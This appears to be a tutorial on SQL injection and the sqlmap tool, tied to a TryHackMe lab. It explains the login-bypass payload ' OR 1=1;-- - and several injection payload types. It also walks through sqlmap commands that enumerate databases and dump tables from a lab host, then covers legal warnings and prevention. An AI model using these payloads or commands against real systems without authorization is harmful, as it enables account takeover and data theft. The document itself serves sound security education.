# SQL Injection & SQLMap

## What is a Database?

A **database** is a structured collection of data that applications use to store, modify, and retrieve information efficiently. Databases are managed by **Database Management Systems (DBMS)** such as:
- MySQL
- PostgreSQL
- SQLite
- Microsoft SQL Server

### Database Communication
Applications interact with databases using **SQL (Structured Query Language)** queries to:
- **Store** data (user registrations, posts, etc.)
- **Retrieve** data (login verification, search results)
- **Modify** data (update profiles, delete records)

---

## What is SQL Injection?

**SQL Injection** is a web security vulnerability that allows attackers to manipulate SQL queries by injecting malicious input when user input is not properly validated or sanitized.

### How SQL Injection Works

#### Normal Login Query
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

**Process:**
1. User enters credentials
2. Application creates SQL query with user input
3. Database checks if username AND password match
4. If match found, user is authenticated

#### Vulnerable Login (SQL Injection)

**Attacker Input:**
- Username: `John`
- Password: `abc' OR 1=1;-- -`

**Resulting Query:**
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

**Breakdown:**
1. `password = 'abc'` - False (random password)
2. `OR 1=1` - **Always True** (boolean logic bypass)
3. `-- -` - SQL comment (ignores everything after)
4. **Result**: Query succeeds, attacker logs in as John

### Key Attack Components

**Single Quote (`'`) Manipulation:**
- Closes the password string early
- Allows injection of SQL logic
- Without `'`: entire string treated as password
- With `'`: breaks out of string context to inject `OR 1=1`

**Boolean Logic Abuse:**
- `AND` requires both conditions true
- `OR` requires only one condition true
- `1=1` is always true → bypasses authentication

**SQL Comments:**
- `-- -` (MySQL, SQL Server)
- `#` (MySQL)
- `/* */` (Multi-line comments)
- Removes remaining query parts to avoid syntax errors

---

## SQLMap - Automated SQL Injection Tool

**SQLMap** is a command-line tool that automates the detection and exploitation of SQL injection vulnerabilities.

### Basic Usage

#### Interactive Wizard (Beginner-Friendly)
```bash
sqlmap --wizard
```
Guides you through each step with questions.

#### View All Options
```bash
sqlmap --help
```

---

## SQLMap Flags & Commands

### Testing for SQL Injection

**Test GET parameter:**
```bash
sqlmap -u "http://target.com/search?cat=1"
```

**Test intercepted POST request:**
```bash
sqlmap -r intercepted_request.txt
```

### Common Flags

| Flag | Purpose | Example |
|------|---------|---------|
| `-u` | Target URL | `-u "http://example.com/page?id=1"` |
| `-r` | Request file (POST) | `-r login_request.txt` |
| `--dbs` | Enumerate databases | `--dbs` |
| `-D` | Specify database | `-D users` |
| `--tables` | List tables | `-D users --tables` |
| `-T` | Specify table | `-T admin` |
| `--dump` | Extract data | `-T admin --dump` |
| `--columns` | List columns | `-T users --columns` |
| `--wizard` | Interactive mode | `--wizard` |

---

## SQLMap Workflow Example

### Step 1: Test URL for Vulnerability
```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1"
```

**Output:**
```
[INFO] GET parameter 'cat' is vulnerable
Parameter: cat (GET)
    Type: boolean-based blind
    Type: error-based
    Type: time-based blind
    Type: UNION query

back-end DBMS: MySQL >= 5.1
```

### Step 2: Enumerate Databases
```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" --dbs
```

**Output:**
```
available databases [2]:
[*] users
[*] members
```

### Step 3: List Tables in Database
```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" -D users --tables
```

**Output:**
```
Database: users
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |
+-----------+
```

### Step 4: Dump Table Data
```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" -D users -T thomas --dump
```

**Output:**
```
Database: users
Table: thomas
[1 entry]
+---------------------+------------+---------+
| Date                | name       | pass    |
+---------------------+------------+---------+
| 09/09/2024          | Thomas THM | testing |
+---------------------+------------+---------+
```

---

## SQL Injection Types

SQLMap can detect and exploit multiple injection types:

### 1. Boolean-Based Blind
- Modifies query with boolean expression (e.g., `1=1`)
- Observes TRUE/FALSE responses to extract data
- Payload: `cat=1 AND 2175=2175`

### 2. Error-Based
- Intentionally causes database errors
- Extracts data from error messages
- Payload: `cat=1 AND EXTRACTVALUE(...)`

### 3. Time-Based Blind
- Uses SQL delay functions (e.g., `SLEEP()`)
- Measures response time to confirm injection
- Payload: `cat=1 AND SLEEP(5)`

### 4. UNION Query
- Combines results from multiple SELECT statements
- Extracts data directly in response
- Payload: `cat=1 UNION ALL SELECT ...`

---

## GET vs POST Testing

### GET Request Testing
```bash
sqlmap -u "http://target.com/page?id=1"
```
- Parameters in URL
- Example: `?id=1`, `?search=test`

### POST Request Testing
```bash
sqlmap -r request.txt
```

**Steps:**
1. Intercept POST request (Burp Suite, browser DevTools)
2. Save request to file
3. Use `-r` flag with SQLMap

**Use Cases:**
- Login forms
- Registration forms
- Contact forms
- Any form using POST method

---

## Real-World Impact

SQL injection can lead to:
- **Authentication bypass** - Unauthorized access to accounts
- **Data theft** - Extraction of sensitive information (passwords, credit cards, PII)
- **Data modification** - Altering or deleting records
- **Complete system compromise** - OS command execution in some cases
- **Privilege escalation** - Gaining admin access

---

## Legal & Ethical Considerations

⚠️ **WARNING**: Only perform SQL injection testing on:
- Systems you own
- Systems with explicit written permission
- Authorized penetration testing engagements
- CTF/lab environments (TryHackMe, HackTheBox)

**Unauthorized testing is illegal** and can result in:
- Criminal charges
- Fines
- Imprisonment
- Loss of certifications/employment

---

## Prevention (Blue Team Perspective)

**Input Validation:**
- Whitelist acceptable input
- Reject malicious characters (`'`, `;`, `--`)

**Parameterized Queries (Prepared Statements):**
```php
// Vulnerable
$query = "SELECT * FROM users WHERE id = '$id'";

// Secure
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

**Least Privilege:**
- Database user should have minimal permissions
- Read-only where possible

**WAF (Web Application Firewall):**
- Detect and block SQL injection attempts
- Monitor for suspicious patterns

---

## Key Takeaways

- SQL injection exploits **improper input validation**
- `OR 1=1` is a classic bypass technique
- SQLMap **automates** vulnerability detection and exploitation
- Always use `--wizard` for beginners
- GET parameters are common injection points
- POST forms require request interception
- **Only test with authorization**